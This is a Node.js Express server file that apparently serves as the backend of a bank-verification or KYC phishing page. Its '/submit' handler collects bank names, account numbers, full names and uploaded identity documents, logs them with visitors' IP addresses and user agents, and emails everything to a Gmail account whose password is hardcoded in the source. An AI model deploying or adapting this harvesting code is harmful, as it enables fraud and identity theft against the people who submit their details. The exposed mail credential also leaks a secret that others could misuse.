const express = require('express');
const multer = require('multer');
const fs = require('fs');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const port = process.env.PORT;

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads'),
  filename: (req, file, cb) =>
    cb(null, Date.now() + '-' + file.originalname.replace(/\s+/g, '_'))
});
const upload = multer({ storage });

app.post('/submit', upload.single('document'), (req, res) => {
  const { bankname, accno, fullname } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const file = req.file;
  const timestamp = new Date().toISOString();

  const logEntry = `
--- Submission: ${timestamp} ---
Bank Name: ${bankname}
Account No: ${accno}
Full Name: ${fullname}
File: ${file.path}
IP: ${ip}
User Agent: ${userAgent}
`;

  fs.appendFileSync('records.txt', logEntry);
  const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'kexm wnes pcwx rkjt'
  }
});

const mailOptions = {
  from: 'dcbsubmission392@gmail.com',
  to: 'dcbsubmission392@gmail.com',
  subject: '🔔 New Bank Verification Submission',
  text: `
New submission received:

Bank Name: ${bankname}
Account Number: ${accno}
Full Name: ${fullname}
Uploaded File Path: ${file.path}

IP: ${ip}
Timestamp: ${timestamp}
User Agent: ${userAgent}
  `,
  attachments: [
    {
      filename: file.originalname,
      path: file.path
    }
  ]
};

transporter.sendMail(mailOptions, (error, info) => {
  if (error) {
    console.error('❌ Email failed:', error);
  } else {
    console.log('✅ Email sent:', info.response);
  }
});
  res.send('<h2>✅ Submitted Successfully!</h2><p>Your KYC info has been received.</p>');
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
